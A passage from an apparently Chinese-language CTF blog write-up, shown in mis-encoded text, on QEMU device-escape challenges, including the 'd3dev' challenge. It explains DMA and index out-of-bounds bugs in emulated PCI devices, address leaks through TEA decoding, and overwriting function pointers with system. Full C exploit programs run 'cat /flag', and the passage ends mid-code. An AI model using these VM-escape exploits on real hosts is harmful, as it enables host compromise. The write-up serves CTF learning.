class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">2</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line"><span class="type">uint64_t</span> call_system_addr=enc_addr<span class="number">-0x862b8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;system_addr @ %llx\n&quot;</span>,call_system_addr);</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª <code>exp</code> å…ˆæ‰“å°äº†æˆ‘å®šä¹‰çš„ <code>enc_addr</code> è¿™ä¸ªå˜é‡åœ¨ <code>qemu</code> ä¸­çš„è™šæ‹Ÿåœ°å€ï¼Œä»¥åŠåœ¨ <code>qemu</code> ä¸­çš„ç‰©ç†åœ°å€ï¼Œå’Œå˜é‡æœ¬èº«çš„å€¼ã€‚å½“æ‰§è¡Œå®Œ <code>cpu_physical_memory_rw</code> å‡½æ•°åå†æ¬¡æ‰“å° <code>enc_addr</code> å˜é‡çš„å€¼ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820680.png" alt="image-20230304175344273"></p>
<p>å¯ä»¥å‘ç° <code>enc_value</code> ä»æœ€å¼€å§‹çš„ <code>0</code> åœ¨ <code>cpu_physical_memory_rw</code> å‡½æ•°æ‰§è¡Œåï¼Œå˜æˆäº† <code>0x55835e3b3dd0</code> ï¼Œè¿™ä¸ªåœ°å€æ­£æ˜¯ <code>enc</code> å‡½æ•°çš„åœ°å€ã€‚ä»è€Œè¯´æ˜äº† <code>cpu_physical_memory_rw</code> å‡½æ•°å¯ä»¥å°†ä¸€ä¸ªå€¼å†™å…¥åˆ°æˆ‘ä»¬æŒ‡å®šçš„ç‰©ç†å†…å­˜ä¸­</p>
<p>å¦‚æœèƒ½ç†è§£ä¸Šé¢è¿™ä¸ªå°† <code>enc</code> å‡½æ•°çš„åœ°å€è¯»åˆ°ç‰©ç†åœ°å€ä¸Šçš„è¿‡ç¨‹ï¼Œé‚£ä¾æ¬¡ç±»æ¨ï¼Œå°†ç‰©ç†åœ°å€ä¸­çš„æ•°æ®å†™å› <code>opaque-&gt;dma_buf[v2]</code> ä¹Ÿå°±å¾ˆå¥½ç†è§£äº†ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820582.png" alt="image-20230304201045218"></p>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœç”¨ <code>IDA</code> æ¥çœ‹è¿™ä¸ª <code>v6</code> åé¢çš„èµ‹å€¼ä¼šæ„Ÿè§‰ååˆ†éš¾ç†è§£ï¼Œè¿™é‡Œåè€Œçœ‹æ±‡ç¼–ä¼šæ›´å®¹æ˜“ç†è§£ã€‚</p>
<p>æ±‡ç¼–éƒ¨åˆ†å¦‚ä¸‹</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820277.png" alt="image-20230304201218093"></p>
<p>é€šè¿‡åˆ†æè¿™å››è¡Œæ±‡ç¼–ï¼Œå‘ç°ä¸Šé¢ç»™ <code>v6</code> èµ‹å€¼çš„ä»£ç å°±æ˜¯ <code>opaque-&gt;dma_buf[opaque-&gt;dma.dst-0x40000]</code> </p>
<p>æ‰€ä»¥æ§åˆ¶ <code>dma.dst</code> ä¸º <code>0x41000</code> ï¼Œæ­¤æ—¶å°±æ˜¯ <code>dma_buf[0x1000]</code> è¿™ä¸ªä½ç½®æ”¾çš„å°±æ˜¯ <code>enc</code> å‡½æ•°çš„åœ°å€ï¼Œ<code>cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0)</code> å‡½æ•°ä¼šå°† <code>opaque-&gt;dma.src</code> ä¸­çš„æ•°æ®è¯»å…¥åˆ° <code>dma_buf[0x1000]</code> çš„ä½ç½®ï¼Œå› ä¸º <code>dma.src</code> æ˜¯ç‰©ç†å†…å­˜åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å°† <code>system</code> å‡½æ•°çš„ç‰©ç†åœ°å€å†™å…¥ <code>dma.src</code> ã€‚</p>
<p>æœ€åæˆ‘ä»¬ä¾ç„¶åˆ©ç”¨ä¸€æ¬¡ <code>cpu_physical_memory_rw</code> å‡½æ•°æ¥å¾€è™šæ‹Ÿåœ°å€ä¸­å†™å‚æ•°ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820553.png" alt="image-20230304202531687"></p>
<p>æ­¤æ—¶æˆ‘ä»¬çš„ <code>v6</code> è¦å†™ä¸ºå‚æ•°çš„åœ°å€ï¼Œè¿™å›æˆ‘ä»¬ä¸éœ€è¦æ•°ç»„ç´¢å¼•æº¢å‡ºäº†ï¼Œå› æ­¤æˆ‘é€‰æ‹©äº†å°†å‚æ•°å†™å…¥åˆ° <code>opaque-&gt;dma_buf[0]</code> çš„ä½ç½®ï¼Œç„¶åè¿›å…¥ <code>(v4 &amp; 4)!=0</code> è¿™ä¸ªåˆ†æ”¯ï¼Œå»è°ƒç”¨ <code>opaque-&gt;enc((char *)v6,cnt_low)</code>  åŠ«æŒæ‰§è¡Œæµï¼Œè°ƒç”¨ <code>system(&quot;cat /flag&quot;)</code> </p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc050</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> * addr)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> page;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="type">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="type">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	perror(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">unsigned</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint64_t</span> *)mmio_mem + addr );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem+addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:04.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">	<span class="comment">//printf(&quot;mmio_write @ ----&gt; %p\n&quot;,mmio_write);</span></span><br><span class="line">    getchar();</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//-----------leak libc address----------</span></span><br><span class="line">    <span class="type">uint64_t</span> enc_addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_addr @ %llx\n&quot;</span>,&amp;enc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_physics_addr @ %llx\n&quot;</span>,gva_to_gpa(&amp;enc_addr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,gva_to_gpa(&amp;enc_addr));<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">2</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">    <span class="type">uint64_t</span> call_system_addr=enc_addr<span class="number">-0x862b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system_addr @ %llx\n&quot;</span>,call_system_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//----------write system address---------</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>,gva_to_gpa(&amp;call_system_addr));<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------Control parameters-----------</span></span><br><span class="line">    <span class="type">char</span> *command=<span class="string">&quot;cat /flag;cat /root/flag;cat flag;pwd&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;command address is %llx&quot;</span>,command);</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,gva_to_gpa(command));<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,<span class="number">0x40000</span>);<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="built_in">strlen</span>(command));<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">0x4</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820957.png" alt="image-20230304172709467"></p>
<h3 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h3><h4 id="é¢˜ç›®é™„ä»¶"><a href="#é¢˜ç›®é™„ä»¶" class="headerlink" title="é¢˜ç›®é™„ä»¶"></a>é¢˜ç›®é™„ä»¶</h4><p>é“¾æ¥: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1z1-Wk30RJEmQTSsEzVtvig?pwd=t9gp">https://pan.baidu.com/s/1z1-Wk30RJEmQTSsEzVtvig?pwd=t9gp</a> æå–ç : t9gp </p>
<h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820851.png" alt="image-20230316145717263" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820351.png" alt="image-20230316145949280" style="zoom: 67%;" />

<p>é€šè¿‡è§‚å¯Ÿå¯¹æ¯” <code>class_init</code> å‡½æ•°ä¸­çš„æ•°æ®ï¼Œå‘ç° <code>d3dev</code> è®¾å¤‡å·ä¸º <code>00:03.0</code> </p>
<p>æ•°ç»„ç´¢å¼•æº¢å‡ºæ¼æ´ä½äº <code>d3dev_mmio_write</code> å‡½æ•°</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820215.png" alt="image-20230316150429029" style="zoom:50%;" />

<p>è¿™é‡Œçš„ <code>v4</code> æ¥è‡ªäº <code>v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);</code> </p>
<p><code>seek</code> å’Œ <code>addr</code> éƒ½å¯æ§ï¼Œä¹Ÿå°±æ„å‘³ç€ <code>v4</code> å¯æ§ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç´¢å¼•æº¢å‡ºæ¥æ§åˆ¶ <code>rand_r</code> å‡½æ•°æŒ‡é’ˆï¼ˆå¦‚ä¸‹ï¼‰ï¼Œåœ¨ <code>d3dev_pmio_write</code> å‡½æ•°ä¸­ï¼Œè°ƒç”¨äº† <code>rand_r</code> å‡½æ•°ï¼Œå¦‚æœå°† <code>rand_r</code> æ”¹æˆ <code>system</code> å‡½æ•°ï¼Œåˆ™å¯ä»¥è§¦å‘åé—¨ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821297.png" alt="image-20230316151852507"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœä½¿ç”¨ <code>seek</code> é»˜è®¤ä¸º <code>0</code> ï¼Œé‚£ä¹ˆ<code>addr</code> éœ€è¦ä¸º <code>0x818</code> ã€‚ä½†æ˜¯ <code>MMIO</code> åŒºåŸŸä¸º <code>0x800</code> ï¼Œå› æ­¤ä½¿ç”¨ <code>0x818</code> çš„è¯ <code>PCI</code> è®¾å¤‡åœ¨å†…éƒ¨ä¼šæ£€æŸ¥åˆ°è¿™é‡Œå‘ç”Ÿäº†è¶Šç•Œï¼ˆå¦‚ä¸‹ï¼‰ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821884.png" alt="image-20230316152939181" style="zoom:50%;" />



<p>æ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦æ§åˆ¶ <code>seek</code> ä¸º <code>0x100</code> ï¼Œæ§åˆ¶ <code>addr</code> ä¸º <code>0x18</code> , æ‰èƒ½è®© <code>blocks[v4]</code> æ­£å¥½è½åœ¨ <code>rand_r</code> çš„ä½ç½®ã€‚</p>
<h4 id="æ³„éœ²åœ°å€"><a href="#æ³„éœ²åœ°å€" class="headerlink" title="æ³„éœ²åœ°å€"></a>æ³„éœ²åœ°å€</h4><p>å› ä¸ºæœ¬é¢˜å¼€äº† <code>PIE</code> ï¼Œå³ä½¿ç¨‹åºä¸­ç»™äº† <code>system</code> å‡½æ•°ï¼Œä¾ç„¶éœ€è¦æ³„éœ²ç¨‹åºçš„åŸºåœ°å€ã€‚</p>
<p>æ³„éœ²åœ°å€è¿™é‡Œæ¶‰åŠä¸€ä¸ª <code>tea</code> åŠ è§£å¯†</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821914.png" alt="image-20230316153307989"></p>
<p>è¿™é‡Œæ˜¯å¯ä»¥è¶Šç•Œè¯»å– <code>rand_r</code> çš„åœ°å€ï¼Œä½†æ˜¯è¯»å–çš„ç»“æœä¼šæ”¾åˆ° <code>v5</code> ï¼Œç»è¿‡äº† <code>tea</code> åŠ å¯†åï¼Œæœ€ç»ˆ <code>return</code> å°†å…¶è¿”å›ï¼Œæ­¤å¤„çš„ <code>key[0] key[1] key[2] key[3]</code> åœ¨ <code>d3dev_pmio_write</code> å‡½æ•°ä¸­éƒ½å¯ä»¥è¢«è®¾ç½®ä¸º <code>0</code> ï¼ˆå¦‚ä¸‹ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161819077.png" alt="image-20230316154127664" style="zoom:50%;" />

<p>å› æ­¤æœ€åçš„è§£å¯†è„šæœ¬åº”è¯¥å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v[<span class="number">0</span>] += ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span>(i!=<span class="number">0xC6EF3720</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°†æ¥æ”¶åˆ°çš„å¯†æ–‡ç”¨è¿™ä¸ªå‡½æ•°è§£å¯†ï¼Œå³å¯å¾—åˆ° <code>rand_r</code> å‡½æ•°çš„åœ°å€ã€‚</p>
<p>ç”¨ <code>mmio_write</code> å‡½æ•°å†™å…¥ <code>system</code> åœ°å€çš„æ—¶å€™ï¼Œéœ€è¦å…ˆåŠ å¯†åå†™å…¥ï¼Œä¸ç„¶åªèƒ½å†™å…¥å››ä¸ªå­—èŠ‚ã€‚</p>
<p>æœ€åæ§åˆ¶å‚æ•°çš„è¯ï¼Œå‡è®¾æˆ‘ä»¬æƒ³æ‰§è¡Œ <code>cat flag</code> è¿™ä¸ªå‘½ä»¤ï¼Œé‚£ä¹ˆéœ€è¦æŠŠ <code>r_seed</code> è®¾ç½®ä¸º <code>cat </code>ï¼Œå› ä¸º <code>r_seed</code> çš„å¤§å°å°±ä¸ºå››å­—èŠ‚ï¼Œæ‰€ä»¥åªèƒ½å­˜æ”¾ <code>cat </code>ï¼Œè€Œ <code>r_seed</code> ä¸‹é¢çš„æ•°æ®å°±æ˜¯ <code>blocks</code> ,æ‰€ä»¥åœ¨ <code>blocks[0]</code> çš„ä½ç½®å­˜æ”¾å­—ç¬¦ä¸² <code>flag</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821106.png" alt="image-20230316160923121"></p>
<p>æ‰§è¡Œ <code>cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</code> å‘½ä»¤ï¼Œè·å– <code>0xfebf1000</code> ä¸º <code>MMIO</code> åŸºåœ°å€ï¼Œ<code>0xc040</code>  ä¸º <code>PMIO</code> åŸºåœ°å€</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161819207.png" alt="image-20230316161803354" style="zoom:50%;" />

<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc040</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	perror(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *)(mmio_mem+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem+addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123;</span><br><span class="line">    outl(val, PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v[<span class="number">0</span>] += ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span>(i!=<span class="number">0xC6EF3720</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">encode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        v[<span class="number">1</span>] -= ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">0</span>] -= ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        i += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;perror(<span class="string">&quot;iopl failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    getchar();</span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0x0</span>);<span class="comment">//set the key to 0</span></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x100</span>);<span class="comment">//set the seek to 0x100 to prevent addr from overflow the MMIO area</span></span><br><span class="line">    <span class="type">uint64_t</span> rand_r=mmio_read(<span class="number">0x18</span>);<span class="comment">//get address after the tea encode</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r address before decode is @%lx\n&quot;</span>,rand_r);</span><br><span class="line">    decode(&amp;rand_r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r address after decode is @%llx\n&quot;</span>,rand_r);</span><br><span class="line">    <span class="type">uint64_t</span> sys_addr=rand_r+<span class="number">0xa5e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system address is @%llx\n&quot;</span>,sys_addr);</span><br><span class="line">    encode(&amp;sys_addr);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,sys_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> args=<span class="number">0x67616c66</span>;</span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x0</span>);<span class="comment">//set the seek to 0</span></span><br><span class="line">    encode(&amp;args);</span><br><span class="line">    mmio_write(<span class="number">0x0</span>,args);  <span 